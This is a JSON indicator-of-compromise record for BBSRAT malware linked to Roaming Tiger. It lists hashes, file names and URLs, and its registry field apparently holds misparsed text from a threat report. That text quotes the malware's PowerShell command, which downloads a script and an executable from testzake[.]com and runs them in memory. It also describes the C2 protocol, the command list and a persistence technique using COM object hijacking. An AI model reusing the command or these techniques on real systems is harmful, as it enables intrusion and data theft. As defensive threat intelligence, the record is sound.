{"rule_id": 503, "name": "bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger", "description": "-", "references": [], "File_Names": ["srvcl32.dll", "path_to_srvcl32.dll", "www.yunw", "Netapi32.dll", "winwordupdate.dynu", "Secur32.dll", "adobeflashupdate.dynu", "windowsupdate.dyn", "aclmain.sdb", "forum.php", "Crypt32.dll", "path_to_ssonsvr.exe", "WtsApi32.dll", "pnipcn.dll", "ssonsvr.exe"], "MD5_Hashes": ["7533E65A16B4B3BA451A141F389D3A30", "896691AE546F498404F5884607D6EB50", "B934BF027EC3A9DFCAE9D836D68BAB75", "C17534E4B61C08A7646CDC64574B429B", "A78B9438117963A9A18B2F056888498B", "0AA391DC6D9EBEC2F5D0EE6B4A4BA1FA", "2254A1CA05DB87D9D58A71DDB97C7395", "0EA888E970345B2FBFD74B369FE46DDD", "C7C79393E762E7ED925F42D3C899BA60", "FA944818A939456A7B6170326C49569F", "41A02CAF0A0D32FAD5418425F9973616", "74A41C62D9EC1164AF82B802DA3E8B3E", "EF5FA2378307338D4E75DECE88158D77", "8CD233D3F226CB1BF6BF15ACA52E0E36", "B4927EAC9715014E17C53841FEEDF4E1", "AA59EE1E40D22BD22CEE19B8B6A17DF3"], "SHA1_Hashes": ["26E8CFD13175B67C12FC72A11FBDBC749F0B61C0", "EB4F9BDE2FFAE863E0D7AD5848A758D59224C3F7", "B955CA4AA8F7181C2252C4699718F6FEFC0B9CE3", "963E0AD3EC717253A8E74F45D3C552107D6ECACA", "E9744516E621B233C44F5854C0DF63FFDD62FB81", "0EB3AE28A7A7D97ABA30DA4E8EB0A4AB36EFD035", "CB46E6234DA0A9C859C1F71FFEB86100284A0142", "7406B11851200D0ADA1A8334107182D636738CE5", "D390E0965823E42584F2799EF0E8161A6540AF3E", "65B17D3FF68D25392A9B0B9E25A275540DFB4E8D", "98E79C065DB88B4686AB5B7C36C4524333D64C48", "D238C157F87204D03C9005AF9A9CBC28C108E50A", "574230D89EABDE0B6F937CD718B3AD19BB4F5CE3", "91A176EB5B2436762B9898075EC66042E33615A3", "931BAB999568C228616430A5AEDFEDFC34E1F151", "CC83EA6EF4763F24193D56359590BB34127DD36E"], "SHA256_Hashes": ["0fc52c74dd54a97459e964b340d694d8433a3229f61e1c305477f8c56c538f27", "95f198ed29cf3f7d4ddd7cf688bfec9e39d92b78c0a1fd2288e13a92459bdb35", "71DC584564B726ED2E6B1423785037BFB178184419F3C878E02C7DA8BA87C64D", "fc4b465ee8d2053e9e41fb0a6ae32843e4e23145845967a069e584f582279725", "0BAF36CA2D3772FDFF989E2B7E762829D30DB132757340725BB50DEE3B51850C", "d579255852720d794349ae2238f084c6393419af38479f3d0e3d2a21c9eb8e18", "012ec51657d8724338a76574a39db4849579050f02c0103d46d406079afa1e8b", "2D81D65D09BF1B864D8964627E13515CEE7DEDDFBD0DC70B1E67F123AB91421E", "2d81d65d09bf1b864d8964627e13515cee7deddfbd0dc70b1e67f123ab91421e", "4ea23449786b655c495edf258293ac446f2216464b3d1bccb314ef4c61861101", "13D0BD83A023712B54C1DD391DFC1BC27B22D9DF4FE3942E2967EC82D7C95640", "77a2e26097285a794e42c9e813d14936d0e7a1dd3504205dd6b28a71626f8c3c", "71dc584564b726ed2e6b1423785037bfb178184419f3c878e02c7da8ba87c64d", "B1737F3A1C50CB39CD9938D5EC3B4A6A10B711F17E917886481C38967B93E259", "FC4B465EE8D2053E9E41FB0A6AE32843E4E23145845967A069E584F582279725", "22592A32B1193587A707D8B20C04D966FE61B37F7DEF7613D9BB91FF2FE9B13B", "e049bd90028a56b286f4b0b9062a8df2ab2ddf492764e3962f295e9ce33660e3", "22592a32b1193587a707d8b20c04d966fe61b37f7def7613d9bb91ff2fe9b13b", "D579255852720D794349AE2238F084C6393419AF38479F3D0E3D2A21C9EB8E18", "7438ED5F0FBE4B26AFED2FE0E4E4531FC129A44D8EA416F12A77D0C0CD873520", "b1737f3a1c50cb39cd9938d5ec3b4a6a10b711f17e917886481c38967b93e259", "95F198ED29CF3F7D4DDD7CF688BFEC9E39D92B78C0A1FD2288E13A92459BDB35", "44171afafca54129b89a0026006eca03d5307d79a301e4a8a712f796a3fdec6e", "7438ed5f0fbe4b26afed2fe0e4e4531fc129a44d8ea416f12a77d0c0cd873520", "0baf36ca2d3772fdff989e2b7e762829d30db132757340725bb50dee3b51850c", "E049BD90028A56B286F4B0B9062A8DF2AB2DDF492764E3962F295E9CE33660E3", "6FAE5305907CE99F9AB51E720232EF5ACF1950826DB520A847BF8892DC9578DE", "567a5b54d6c153cdd2ddd2b084f1f66fc87587dd691cd2ba8e30d689328a673f", "567A5B54D6C153CDD2DDD2B084F1F66FC87587DD691CD2BA8E30D689328A673F", "77A2E26097285A794E42C9E813D14936D0E7A1DD3504205DD6B28A71626F8C3C", "56D878EDD61176CA30D4A41555671161158E94E8A50E5482985F42C4E4843CB5", "61A692E615E31B97B47A215479E6347FBD8E6E33D7C9D044766B4C1D1AE1B1FB", "6fae5305907ce99f9ab51e720232ef5acf1950826db520a847bf8892dc9578de", "13d0bd83a023712b54c1dd391dfc1bc27b22d9df4fe3942e2967ec82d7c95640", "61a692e615e31b97b47a215479e6347fbd8e6e33d7c9d044766b4c1d1ae1b1fb", "5aa7db3344aa76211bbda3eaaccf1fc1b2e76df97ff9c30e7509701a389bd397"], "Registry_Entries": ["HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe :\n\n[path_to_ssonsvr.exe]\n\nIn the most recently observed sample of BBSRAT found in AutoFocus, the Trojan was deployed\n\nvia a downloader that used the Invoke-ReflectivePEInjection.ps1 script from the PowerSploit\n\nframework.\n\nWhen the downloader executes, it will first decrypt the following two strings using a 5-byte XOR\n\nkey of \u201c\\x01\\x02\\x03\\x04\\x05\u201d:\n\n\u201cpowershell -exec bypass -c IEX (New-Object\n\nNet.WebClient).DownloadString(\u2018http://testzake[.]com/IR.ps1\u2032);Invoke-ReflectivePEInjection -\n\nPEUrl http://testzake[.]com/s.exe\u201d\n\n\u201cC:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell -exec bypass -c IEX (New-\n\nObject Net.WebClient).DownloadString(\u2018http://testzake[.]com/IR.ps1\u2032);Invoke-\n\nReflectivePEInjection -PEUrl http://testzake[.]com/s.exe\u201d\n\nThese strings are then sequentially executed via calls to WinExec. As we can see, the second\n\ncommand is specifically crafted to run on 64-bit versions of Microsoft Windows. The commands\n\nin question will download an executable file and run it within the context of the powershell\n\nprocess.\n\nWhen the above commands are executed, the downloader will initially download the \u2018IR.ps1\u2019\n\npowershell script from the specified URL:\n\n\fFigure 7 Downloader downloading the Invoke-ReflectivePEInjection PowerSploit script\n\nThis Powershell script appears to have been pulled directly from the PowerSploit framework,\n\nwith no modifications made. The malware then invokes this script with a URL that points to an\n\nadditional executable file. This downloaded executable contains a copy of the BBSRAT malware\n\nfamily.\n\nThe downloader proceeds to drop either a 32-bit or 64-bit DLL file that will execute the two\n\npreviously stated Powershell commands when the DLL is loaded. This DLL is dropped to one of\n\nthe following locations:\n\n%SYSTEMROOT%\\web\\srvcl32.dll\n\n%APPDATA%\\web\\srvcl32.dll\n\nAdditionally, the following registry keys are set depending on the system\u2019s CPU architecture:\n\nHKU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-\n\n0c966feabec1}\\InprocServer32\\ThreadingModel \u2013 \u201cBoth\u201d\n\nHKU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-\n\n0c966feabec1}\\InprocServer32\\Default \u2013 [path_to_srvcl32.dll]\n\nHKLM\\SOFTWARE\\Classes\\CLSID\\{F3130CDB-AA52-4C3A-AB32-\n\n85FFC23AF9C1}\\InprocServer32\\ThreadingModel \u2013 \u201cBoth\u201d\n\nHKLM\\SOFTWARE\\Classes\\CLSID\\{F3130CDB-AA52-4C3A-AB32-\n\n85FFC23AF9C1}\\InprocServer32\\Default \u2013 [path_to_srvcl32.dll]\n\nThe COM object for {42aedc87-2188-41fd-b9a3-0c966feabec1} is specific to \u2018MruPidlList\u2019, while\n\nthe COM object for {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} is specific to \u2018Microsoft\n\nWBEM New Event Subsystem\u2019. This ensures that the DLL specified will load when Microsoft\n\nWindows starts. It is a technique that was used by the ZeroAccess rootkit when it initially\n\nsurfaced.\n\nAfter being loaded using one of the two techniques discussed, BBSRAT malware begins\n\nexecution by loading the following libraries at runtime:\n\nntdll.dll\n\nkernel32.dll\n\nuser32.dll\n\nadvapi32.dll\n\ngdi32.dll\n\nws2_32.dll\n\nshell32.dll\n\npsapi.dll\n\nSecur32.dll\n\nWtsApi32.dll\n\nNetapi32.dll\n\nVersion.dll\n\nCrypt32.dll\n\nWininet.dll\n\nThe following mutex is then created to ensure a single instance of BBSRAT is running at a given\n\ntime:\n\nGlobal\\GlobalAcProtectMutex\n\nThroughout the execution of BBSRAT, it will dynamically load functions prior to calling them, as\n\nseen in the example below demonstrating BBSRAT making a call to the WSAStartup function:\n\n\fFigure 8 BBSRAT calling WSAStartup function\n\nThe malware proceeds to parse the stored embedded network configuration and spawns a\n\nseries of threads responsible for network communication. This includes a series of HTTP or\n\nHTTPS requests, such as the following:\n\nGET /bbs/1/forum.php?sid=1 HTTP/1.1\n\nCookie: A46A8AA9-D7D6-43FB-959DC96E\n\nContent-Length:\n\nUser-Agent: Mozilla/4.0 (compatible; Windows NT 5.1)\n\nConnection: Keep-Alive\n\nHost: transactiona[.]com\n\nCache-Control: no-cache\n\nAccept: */*\n\nContent-Type:\n\nIn the above example, the \u20181\u2019 used both in the URI and the sid GET parameter is a global\n\nincremental counter. Every subsequent request made by BBSRAT increments this counter by\n\none. Additionally, all variants of BBSRAT we have found use the same URL for command and\n\ncontrol (C2) communication.\n\nWhen first executed, the malware will exfiltrate data about the victim\u2019s machine via a POST\n\nrequest to the \u2018/bbs/[counter]/forum.php?sid=[counter]\u2019 URL. All network data sent via POST\n\nrequests uses a custom binary structure, as defined as the following:\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\nstruct network_header\n{\n DWORD random;\n DWORD hardcoded0;\n DWORD hardcoded1;\n DWORD command;\n DWORD length_of_compressed_data;\n DWORD length_of_decompressed_data;\n DWORD unknown2;\n BYTE compressed_data[];\n};\n\nThe compressed_data field is compressed using the common ZLIB compression algorithm.\n\nAdditionally, in the event data is being sent via HTTP rather than HTTPS, the following\n\nadditional encryption algorithm is applied to the POST data:\n\n1\n2\n3\n4\n5\n6\n7\n8\n\ndef decrypt(data):\n out = []\n for x in data:\n  t = (ord(x) - 23) \n  t1 = (t ^ 62) \n  t2 = (t1 + 23) & 0xFF\n  out.append(chr(t2))\n return out\n\nThe following data structure holds the victim\u2019s information that is uploaded by BBSRAT:\n\n\f1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\nstruct victim_information\n{\n DWORD static_value;\n DWORD major_version;\n DWORD minor_version;\n DWORD build_number;\n DWORD platform_id;\n DWORD default_locale;\n DWORD unknown;\n DWORD local_ip_address;\n DWORD running_as_64_bit;\n DWORD random;\n DWORD unknown2;\n DWORD struct_length;\n DWORD struct_with_not_used_length;\n DWORD struct_with_username_length;\n DWORD struct_with_group_length;\n DWORD unknown3;\n DWORD struct_with_hostname_length;\n WCHAR not_used[??];\n WCHAR username[??];\n WCHAR group[??];\n WCHAR hostname[??];\n};\n\nBBSRAT accepts many possible commands that the C2 server can provide. These commands\n\nare sent as a response to the GET beacons that are continually requested via either HTTP or\n\nHTTPS. The following commands and sub-commands have been identified:\n\nCommand Sub-\n\nDescription\n\ncommand\n\n0x110010\n\n0x110011\n\n0x110020\n\n0x110064\n\n0x110064\n\n0x110064\n\n0x110066\n\n0x110066\n\n0x110066\n\n0x110066\n\n0x110066\n\n0x110063\n\nN/A\n\nN/A\n\nN/A\n\n0x2\n\n0x4\n\n0x5\n\n0x7\n\n0x9\n\n0xa\n\n0xb\n\n0xc\n\n0xd\n\nBeacon\n\nUninstall/Kill Malware\n\nUpload Victim Information\n\nExecute Command and Return Response\n\nUnknown\n\nExecute Shellcode\n\nQuery Service Configuration\n\nStart Service\n\nStop Service\n\nDelete Service\n\nChange Service Configuration\n\nEnumerate Running Processes\n\n0x110063\n\n0xf\n\nKill Process\n\n0x110063\n\n0x10\n\nGet Process Information\n\n0x110063\n\n0x12\n\nFree Library for Specified Process\n\n0x110065\n\n0x1b\n\nExecute Command Quietly\n\n0x110065\n\n0x1e\n\nSend Input to Console\n\n0x110065\n\n0x1f\n\nExecute Shellcode\n\n0x110061\n\n0x20\n\nList Drive Information\n\n0x110061\n\n0x21\n\nList File Information For Given Directory\n\n0x110061\n\n0x23\n\n0x110061\n\n0x24\n\nWrite File\n\nRead File\n\n0x110061\n\n0x25\n\nList File Information For Given Directory\n\n0x110061\n\n0x27\n\nPerform File Operation via SHFileOperation()\n\n0x110061\n\n0x28\n\nDelete File\n\n0x110061\n\n0x29\n\nCreate Directory\n\n0x110061\n\n0x2a\n\nShell Execute\n\nPlease refer to the appendix for a full list of identified BBSRAT samples and their associated C2\n\nservers.\n\nAs in many of the previous articles regarding espionage-motivated adversaries and possible\n\nnation-state campaigns, what is being observed in this attack campaign is a continued operation\n\nand evolution by the adversary even after its tactics, techniques, and procedures (TTPs) have\n\nbecome public knowledge. Despite the fact that the information about these attackers has been\n\npublic for over a year, including a listing of many of the command and control servers, they\n\ncontinue to reuse much of their exposed playbook. We urge organizations to use the data from\n\nUnit 42 and other threat intelligence sources is paramount to proactively secure themselves and\n\nprevent attacks.\n\nWildFire properly classifies BBSRAT malware samples as malicious. We have released DNS\n\nsignatures to block access to the C2 domain names included in this report. AutoFocus users\n\ncan explore these attacks using the BBSRAT malware family tag.\n\n\f1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\nrule bbsrat {\n meta:\n  author = "], "URLs": ["http://testzake[.]com/IR.ps1", "http://testzake[.]com/s.exe"], "weight": 0.0}